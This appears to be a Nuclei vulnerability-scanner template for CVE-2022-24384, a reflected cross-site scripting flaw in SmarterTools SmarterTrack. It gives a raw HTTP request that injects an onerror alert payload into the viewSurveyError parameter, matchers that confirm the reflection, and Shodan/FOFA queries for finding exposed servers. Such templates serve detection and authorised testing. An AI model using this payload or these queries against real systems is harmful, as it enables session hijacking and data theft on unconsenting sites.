id: CVE-2022-24384

info:
  name: SmarterTools SmarterTrack - Cross-Site Scripting
  author: E1A
  severity: medium
  description: |
    Cross-site Scripting (XSS) vulnerability in SmarterTools SmarterTrack This issue affects: SmarterTools SmarterTrack 100.0.8019.14010.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patches or updates provided by SmarterTools to fix this vulnerability.
  reference:
    - https://csirt.divd.nl/CVE-2022-24384
    - https://csirt.divd.nl/DIVD-2021-00029
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-24384
    cwe-id: CWE-79
    epss-score: 0.51084
    epss-percentile: 0.97791
    cpe: cpe:2.3:a:smartertools:smartertrack:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: smartertools
    product: smartertrack
    shodan-query: http.favicon.hash:1410071322
    fofa-query: icon_hash=1410071322
  tags: cve,cve2022,xss,smartertrack,smartertools

http:
  - raw:
      - |+
        GET /Main/Default.aspx?viewSurveyError=Unknown+survey"><img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - '"type":"error","text":"Unknown survey\"><img src=x onerror=alert(document.domain)>"'
          - 'smartertrack'
        condition: and
# digest: 4b0a00483046022100b2a21d5ab69a5aa0d027842a290fb9d617763f491dd50fb9724ec87f4753a570022100d2cbf5db289848a2456dd7ace16e826ca18255308e3b6959e82967dbe4b3be92:922c64590222798bb761d5b6d8e72950